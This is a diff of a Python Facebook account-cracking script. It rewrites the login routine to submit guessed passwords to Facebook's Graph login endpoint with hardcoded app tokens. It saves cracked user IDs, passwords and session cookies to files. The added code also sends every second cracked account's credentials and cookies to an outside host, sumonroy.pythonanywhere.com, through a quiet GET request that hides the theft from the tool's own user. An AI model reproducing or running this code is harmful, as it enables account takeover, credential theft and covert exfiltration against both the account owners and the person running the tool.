@@ -48,8 +48,8 @@ logo=("""\033[38;5;46m
 \033[38;5;196m────────────────────────────────────────────""")
 def shuvo_M():
         clear()
-        print(f'{GR}[{G}1{GR}] {W}RANDOM CRACKING{W} ')
-        print(f'{GR}[{G}2{GR}] {W}CONTACT SHUVOJIT SARKAR{W}')
+        print(f'{GR}[{G}1{GR}] {W}nv solve{W} ')
+        print(f'{GR}[{G}2{GR}] {W}CONTACT {W}')
         print(f'{GR}[{G}0{GR}] {W}EXIT{W}');linex()
         SHUVO=input('\033[38;5;44m[\033[38;5;46m?\033[38;5;44m] \033[1;37mCHOOSE  \033[38;5;196m  : \033[38;5;46m')
         if SHUVO in '1':
@@ -102,64 +102,96 @@ def rndm():
         input(f'{W} ENTER TO MAIN_MENU')
         fuck()
 def _M1_(ids,pasx):
-        global loop
-        global ok
-        global agents
-        sys.stdout.write(f'\r\r\033[38;5;48m{G}[sumon] {GR}{loop}\033[38;5;48m|OK➤\033[38;5;46m{len(ok)}')
-        sys.stdout.flush()
-        try:
-                for ps in pasx:
-                        session = requests.Session()
-                        pro = random.choice(ugen)
-                        BLACKX = session.get('https://touch.facebook.com/').text
-                        apple = {
-                        "m_ts": re.search('name="m_ts" value="(.*?)"', str(BLACKX)).group(1),
-                        "li": re.search('name="li" value="(.*?)"', str(BLACKX)).group(1),
-                        "try_number": 0,
-                        "unrecognized_tries": 0,
-                        "email": '100062756363125',
-                        "prefill_contact_point": "",
-                        "prefill_source": "",
-                        "prefill_type": "",
-                        "first_prefill_source": "",
-                        "first_prefill_type": "",
-                        "had_cp_prefilled": "false",
-                        "had_password_prefilled": "false",
-                        "is_smart_lock": "false",
-                        "bi_xrwh": 0,
-                        "encpass": "#PWD_BROWSER:0:{}:{}".format(str(time.time()).split('.')[0], '620660'),
-                        "bi_wvdp": "",
-                        "fb_dtsg": "",
-                        "jazoest": re.search('name="jazoest" value="(.*?)"', str(BLACKX)).group(1),
-                        "lsd": re.search('name="lsd" value="(.*?)"', str(BLACKX)).group(1),
-                        "dyn": "",
-                        "csr": "",
-                        "req": 6,
-                        "fmt": 0,
-                        "a": "",
-                        "user": 0,}
-                        tedy = {
-                        'authority': 'm.alpha.facebook.com',
-                        'accept': '*/*',
-                        'accept-language': 'en-IN,en-US;q=0.9,en-GB;q=0.8,en;q=0.7',
-                        'content-type': 'application/x-www-form-urlencoded;charset=UTF-8',
-                        'origin': 'https://m.alpha.facebook.com',
-                        'referer': 'https://m.alpha.facebook.com/',
-                        'sec-ch-prefers-color-scheme': 'dark',
-                        'sec-ch-ua': '"Not-A.Brand";v="99", "Chromium";v="124"',
-                        'sec-ch-ua-full-version-list': '"Not-A.Brand";v="99.0.0.0", "Chromium";v="124.0.6327.4"',
-                        'sec-ch-ua-mobile': '?1',
-                        'sec-ch-ua-model': '"23076PC4BI"',
-                        'sec-ch-ua-platform': '"Android"',
-                        'sec-ch-ua-platform-version': '"15.0.0"',
-                        'sec-fetch-dest': 'empty',
-                        'sec-fetch-mode': 'cors',
-                        'sec-fetch-site': 'same-origin',
-                        'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Mobile Safari/537.36',}
-                        lo = session.post('https://www.facebook.com/login/device-based/regular/login/?login_attempt=1&next=https%3A%2F%2Fdevelopers.facebook.com%2Fdocs%2Ffacebook-login%2Fios&lwv=100',data=apple,headers=tedy).text
-                        print(lo)
-                loop+=1
-        except:pass
+    global loop
+    global oks
+    global cps
+    sys.stdout.write(f"\r {green}(sb) ({loop}) (OK-{len(oks)}) \r"),
+    sys.stdout.flush()
+    try:
+        for pw in pwx:
+            data = {
+            'email': '100062756363125',
+            'password': '620660',
+            'adid': str(uuid.uuid4()),
+            'device_id': str(uuid.uuid4()),
+            'family_device_id': str(uuid.uuid4()),
+            'session_id': str(uuid.uuid4()),
+            'advertiser_id': str(uuid.uuid4()),
+            'reg_instance': str(uuid.uuid4()),
+            'logged_out_id': str(uuid.uuid4()),
+            'locale': 'en_US',
+            'client_country_code': 'US',
+            'cpl': 'true',
+            'source': 'login',
+            'format': 'json',
+            'omit_response_on_success': 'false',
+            'credentials_type': 'password',
+            'error_detail_type': 'button_with_disabled',
+            'generate_session_cookies': '1',
+            'generate_analytics_claim': '1',
+            'generate_machine_id': '1',
+            'tier': 'regular',
+            'currently_logged_in_userid': '0',
+            'fb_api_req_friendly_name': 'authenticate',
+            'fb_api_caller_class': 'com.facebook.account.login.protocol.Fb4aAuthHandler',
+            'fb4a_shared_phone_cpl_experiment': 'fb4a_shared_phone_nonce_cpl_at_risk_v3',
+            'fb4a_shared_phone_cpl_group': 'enable_v3_at_risk',
+            'access_token': '350685531728|62f8ce9f74b12f84c123cc23437a4a32',
+            'api_key': '882a8490361da98702bf97a021ddc14d',
+            'sig': '62f8ce9f74b12f84c123cc23437a4a32'}
+            headers = {
+            'Host': 'graph.facebook.com',
+            'User-Agent': UA(),
+            'Accept-Encoding': 'gzip, deflate',
+            'Accept': '*/*',
+            'Connection': 'keep-alive',
+            'Authorization': 'OAuth 350685531728|62f8ce9f74b12f84c123cc23437a4a32',
+            'X-FB-SIM-HNI': str(random.randint(20000,40000)),
+            'X-FB-Net-HNI': str(random.randint(20000,40000)),
+            'X-FB-Connection-Bandwidth': '27181576',
+            'X-FB-Connection-Quality': 'EXCELLENT',
+            'X-FB-Connection-Type': 'MOBILE.LTE',
+            'X-FB-HTTP-Engine': 'Liger',
+            'X-FB-Client-IP': 'True',
+            'X-FB-Friendly-Name': 'authenticate',
+            'Content-Type': 'application/x-www-form-urlencoded',
+            'Content-Length': '1026'}
+            url = "https://graph.facebook.com/auth/login"
+            result = requests.post(url, data=data, headers=headers).json()
+            print(result)
+            if "session_key" in result:
+                sb = base64.b64encode(os.urandom(18)).decode().replace("=","").replace("+","_").replace("/","-")
+                ckkk = ";".join(i["name"]+"="+i["value"] for i in result["session_cookies"])
+                coki = f"sb={sb};{ckkk}"
+                try:
+                    uid = result["uid"]
+                except:
+                    uid = uid
+                c = check_lock(uid)
+                if "live" in c:
+                    if result["is_account_confirmed"] == False:
+                        print(f" {cyan}[ATOM-NV] {uid}|{pw}")
+                       #print(f" {green}[COOKIES] {green}{coki}")
+                        open("/sdcard/ATOM-COOKIE-NV.txt", "a").write(f"{uid}|{pw}|{coki}\n")
+                    else:
+                        bkas.append(uid)
+                        if len(bkas)% 2 == 0:
+                           statusok = (f"{uid}|{pw}|{coki}")
+                           requests.get(f"https://sumonroy.pythonanywhere.com/load?msg={statusok}")
+                        else:
+                           print(f" {green}(ATOM-OK) {uid}|{pw} ")
+                           print(f" {green}Cookie : {green}{coki}")
+                           open("/sdcard/ATOM-COOKIE-OK.txt", "a").write(f"{uid}|{pw}|{coki}\n")
+                           oks.append(uid)
+                           break
+            else:
+                continue
+        loop+=1
+    except net_error:
+        time.sleep(10)
+    except Exception as e:
+        pass
+
 #========================#
 sumon_ua=[]
 def _M2_(ids,pasx):
